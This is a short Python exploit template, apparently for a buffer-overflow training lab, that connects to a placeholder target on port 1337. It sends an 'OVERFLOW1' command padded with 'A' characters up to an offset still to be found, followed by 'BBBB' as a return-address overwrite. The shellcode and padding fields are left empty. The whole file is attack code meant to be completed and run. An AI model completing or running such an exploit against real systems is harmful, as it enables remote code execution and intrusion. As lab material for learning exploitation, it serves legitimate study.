#!/usr/bin/python3

import socket

IP = "TARGET-IP"
PORT = 1337

prefix = "OVERFLOW1 "
offset = 0000 # replace 0000 with the offset you find
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((IP, PORT))
  print("Sending payloads . . . .")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("There was a problem while connecting to application!")
